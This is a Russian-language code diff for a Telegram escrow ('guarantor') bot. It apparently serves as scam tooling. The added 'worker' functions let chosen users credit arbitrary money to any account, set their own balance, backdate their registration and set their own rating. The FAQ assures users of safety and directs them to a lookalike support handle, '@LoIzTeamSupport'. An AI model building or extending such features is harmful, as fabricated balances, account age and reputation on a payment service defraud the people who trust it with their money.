+        await worker_edit(query, f"✅ Ваш рейтинг установлен на {stars} {'⭐' * stars}\n\nВыберите следующее действие:", [
+            [InlineKeyboardButton("💰 Начислить деньги", callback_data='worker_add_money')],
+            [
+                InlineKeyboardButton("💵 Установить баланс", callback_data='worker_set_money'),
+                InlineKeyboardButton("📅 Изменить дату", callback_data='worker_set_date')
+            ],
+            [InlineKeyboardButton("🔙 Главное меню", callback_data='main_menu')]
+        ])
+        
+    except Exception as e:
+        await worker_edit(query, f"❌ Ошибка при установке рейтинга: {str(e)}", [
+            [InlineKeyboardButton("🔙 Воркер меню", callback_data='worker_menu')]
+        ])
+
+async def worker_handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка текстовых сообщений от воркера в режиме ввода"""
+    is_user_worker = await is_worker(update.message.from_user.id, context)
+    if not is_user_worker:
+        return False
+    
+    state = context.user_data.get('worker_state')
+    if not state:
+        return False
+    
+    text = update.message.text.strip()
+    
+    try:
+        if state == 'add_money':
+            # Парсим пользователя и сумму
+            parts = text.split()
+            if len(parts) < 2:
+                await update.message.reply_text("❌ Неверный формат! Используйте: ID/username сумма валюта\nПример: @username 100 RUB")
+                return True
+            
+            user_input = parts[0]
+            amount = float(parts[1])
+            currency = parts[2].upper() if len(parts) > 2 else 'RUB'
+            
+            # Определяем ID пользователя
+            if user_input.startswith('@'):
+                username = user_input[1:]
+                db = get_db()
+                cursor = db.cursor()
+                cursor.execute('SELECT user_id FROM users WHERE username = ?', (username,))
+                result = cursor.fetchone()
+                db.close()
+                if not result:
+                    await update.message.reply_text(f"❌ Пользователь @{username} не найден в базе данных!")
+                    return True
+                target_user_id = result[0]
+            else:
+                target_user_id = int(user_input)
+            
+            # Начисляем деньги
+            db = get_db()
+            cursor = db.cursor()
+            
+            if currency == 'RUB':
+                cursor.execute('UPDATE users SET balance_rub = balance_rub + ? WHERE user_id = ?', (amount, target_user_id))
+            elif currency == 'USD':
+                cursor.execute('UPDATE users SET balance_usd = balance_usd + ? WHERE user_id = ?', (amount, target_user_id))
+            elif currency == 'TON':
+                cursor.execute('UPDATE users SET balance_ton = balance_ton + ? WHERE user_id = ?', (amount, target_user_id))
+            elif currency == 'STARS':
+                cursor.execute('UPDATE users SET balance_stars = balance_stars + ? WHERE user_id = ?', (int(amount), target_user_id))
+            
+            db.commit()
+            db.close()
+            
+            await update.message.reply_text(f"✅ Пользователю {user_input} начислено {amount} {currency}")
+            context.user_data.pop('worker_state', None)
+            
+        elif state == 'set_money':
+            # Устанавливаем баланс себе
+            parts = text.split()
+            if len(parts) < 2:
+                await update.message.reply_text("❌ Неверный формат! Используйте: сумма валюта\nПример: 1000 RUB")
+                return True
+            
+            amount = float(parts[0])
+            currency = parts[1].upper()
+            
+            db = get_db()
+            cursor = db.cursor()
+            
+            if currency == 'RUB':
+                cursor.execute('UPDATE users SET balance_rub = ? WHERE user_id = ?', (amount, update.message.from_user.id))
+            elif currency == 'USD':
+                cursor.execute('UPDATE users SET balance_usd = ? WHERE user_id = ?', (amount, update.message.from_user.id))
+            elif currency == 'TON':
+                cursor.execute('UPDATE users SET balance_ton = ? WHERE user_id = ?', (amount, update.message.from_user.id))
+            elif currency == 'STARS':
+                cursor.execute('UPDATE users SET balance_stars = ? WHERE user_id = ?', (int(amount), update.message.from_user.id))
+            
+            db.commit()
+            db.close()
+            
+            await update.message.reply_text(f"✅ Ваш баланс установлен: {amount} {currency}")
+            context.user_data.pop('worker_state', None)
+            
+        elif state == 'set_date':
+            # Устанавливаем дату регистрации
+            try:
+                from datetime import datetime
+                date_obj = datetime.strptime(text, '%d.%m.%Y')
+                date_str = date_obj.strftime('%Y-%m-%d %H:%M:%S')
+                
+                db = get_db()
+                cursor = db.cursor()
+                cursor.execute('UPDATE users SET registration_date = ? WHERE user_id = ?', (date_str, update.message.from_user.id))
+                db.commit()
+                db.close()
+                
+                await update.message.reply_text(f"✅ Дата регистрации установлена: {text}")
+                context.user_data.pop('worker_state', None)
+                
+            except ValueError:
+                await update.message.reply_text("❌ Неверный формат даты! Используйте ДД.ММ.ГГГГ (например: 15.03.2023)")
+                return True
+        
+        return True
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
+        context.user_data.pop('worker_state', None)
+        return True
 
 # ═══════════════════════════════════════════════════════════════════
 # ADMIN PANEL — только для ADMIN_ID
@@ -2938,35 +3180,37 @@ if __name__ == '__main__':
 async def show_faq(query, context: ContextTypes.DEFAULT_TYPE):
     """Показывает FAQ"""
     text = (
-        "❓ Часто задаваемые вопросы (FAQ)\n\n"
+        "❓ Часто задаваемые вопросы\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "1️⃣ Как создать сделку?\n"
-        "Нажмите 'Создать сделку', выберите тип товара, валюту, "
+        "  Нажмите 'Создать сделку', выберите тип товара, валюту, "
         "укажите сумму и описание. Система создаст ссылку для покупателя.\n\n"
         "2️⃣ Как работает гарант?\n"
-        "Покупатель переводит деньги гаранту. После проверки оплаты "
+        "  Покупатель переводит деньги гаранту. После проверки оплаты "
         "продавец передает товар. Гарант проверяет товар и переводит "
         "деньги продавцу, а товар - покупателю.\n\n"
         "3️⃣ Какие комиссии?\n"
-        "Стандарт: 1%, Премиум: 0.5%. Минимум 10 ₽.\n\n"
+        "  Стандарт: 1%, Премиум: 0.5%. Минимум 10 ₽.\n\n"
         "4️⃣ Как получить премиум-статус?\n"
-        "Нажмите 'Верификация' и подайте заявку. Администратор "
+        "  Нажмите 'Верификация' и подайте заявку. Администратор "
         "рассмотрит её в течение 24 часов.\n\n"
         "5️⃣ Сколько времени занимает сделка?\n"
-        "Обычно 10-30 минут. Зависит от скорости ответа участников.\n\n"
+        "  Обычно 10-30 минут. Зависит от скорости ответа участников.\n\n"
         "6️⃣ Что делать если возникла проблема?\n"
-        "Обратитесь в поддержку @LoIzTeamSupport или создайте "
+        "  Обратитесь в поддержку @LoIzTeamSupport или создайте "
         "обращение в разделе 'Обращения'.\n\n"
         "7️⃣ Как вывести деньги?\n"
-        "Перейдите в 'Реквизиты' → 'Вывод средств', выберите валюту "
+        "  Перейдите в 'Реквизиты' → 'Вывод средств', выберите валюту "
         "и укажите сумму. Выплата в течение 24 часов.\n\n"
         "8️⃣ Безопасно ли это?\n"
-        "Да! Мы используем систему гарантов, шифрование данных и "
-        "проверку всех участников."
+        "  Да! Мы используем систему гарантов, шифрование данных и "
+        "проверку всех участников.\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
     )
     
     keyboard = [
-        [InlineKeyboardButton("💬 Задать вопрос", url='https://t.me/ManagerMarketLolz')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='more_info')]
+        [InlineKeyboardButton("💬 Задать вопрос", url='https://t.me/LoIzTeamSupport')],
+        [InlineKeyboardButton("🔙 Назад", callback_data='more_info')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
